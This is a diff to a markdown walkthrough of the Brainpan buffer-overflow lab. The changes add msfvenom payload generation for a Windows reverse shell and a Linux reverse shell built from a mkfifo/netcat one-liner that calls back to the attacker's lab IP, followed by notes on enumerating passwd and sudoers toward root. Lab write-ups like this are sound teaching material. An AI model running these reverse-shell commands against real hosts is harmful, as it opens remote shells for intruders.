@@ -68,7 +68,7 @@ IP ID Sequence Generation: All zeros
 
 `nikto -h 192.168.56.106`
 
-* custom application on port 9999
+* custom application running in wine on port 9999
 * python SimpleHTTPServer on port 10000
 
 **Nikto** might be helpful at this moment
@@ -190,9 +190,9 @@ And we find the JMP ESP address
 * Attacker's IP - 192.168.56.101
 * Windows IP - 192.168.56.105
 
-`msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport 443 -f c -o shellcode.txt -b "\x00"`
+`msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport=4444 -f c -b "\x00"`
 
-!()[]
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/msfvenom-windows-shell-reverse-tcp.png)
 
 ```
 import socket
@@ -219,9 +219,23 @@ s.send(payload)
 
 ![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/nc-nlvp-4444.png)
 
+It was really confusing at first. Notice the CMD 1.4.1 label? This is because the windows executable is running through Wine on a Linux machine. Time to switch to Linux shell.
 
-![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/generating-shellcode.png)
+`msfvenom -p linux/x86/exec CMD="mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.101 4444 >/tmp/f" -b "\x00" -f py`
 
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/msfvenom-linux-x86-exec-shell.png)
+
+Time to swap the shellcode in our python script and set a netcat once again.
+
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/netcat-and-python-shell.png)
+
+We're back in the game!
+
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/further-enumeration-shell.png)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/cat-group.png)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/cat-passwd.png)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/ls-la-sudoers.png)
+ 
 ![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/root%40brainpan.png)
 
 ## Conclusion and benefits
